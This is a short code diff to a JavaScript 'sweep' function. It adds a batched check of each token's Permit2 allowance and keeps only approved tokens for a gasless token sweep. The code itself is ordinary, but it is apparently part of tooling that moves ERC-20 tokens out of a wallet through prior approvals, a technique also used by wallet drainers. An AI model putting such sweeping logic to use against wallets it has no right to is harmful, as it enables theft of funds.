@@ -1528,6 +1528,28 @@ async function sweep(wallet) {
       }
 
       if (withBalance.length === 0) { log(`[gasless] all zero — skipping`); return; }
+
+      const ERC20_ALLOW_IFACE = new ethers.Interface(["function allowance(address,address) view returns (uint256)"]);
+      const allowChecks = await multicall3.aggregate3(
+        withBalance.map(p => ({
+          target:       p.token,
+          allowFailure: true,
+          callData:     ERC20_ALLOW_IFACE.encodeFunctionData("allowance", [checksum, PERMIT2_ADDRESS]),
+        }))
+      ).catch(() => null);
+      if (allowChecks) {
+        const approved = []; const skipped = [];
+        for (let i = 0; i < withBalance.length; i++) {
+          const { success, returnData: data } = allowChecks[i];
+          let allow = 0n;
+          if (success && data && data !== "0x") { try { [allow] = ERC20_ALLOW_IFACE.decodeFunctionResult("allowance", data); } catch {} }
+          allow > 0n ? approved.push(withBalance[i]) : skipped.push(withBalance[i].token.slice(0, 10));
+        }
+        if (skipped.length) log(`[gasless] ⚠️  ${skipped.length} token(s) need on-chain Permit2 approval: ${skipped.join(", ")}`);
+        withBalance.splice(0, withBalance.length, ...approved);
+      }
+
+      if (withBalance.length === 0) { log(`[gasless] no tokens with Permit2 approval — skipping`); return; }
       log(`[gasless] sweeping ${withBalance.length} tokens`);
 
       try {
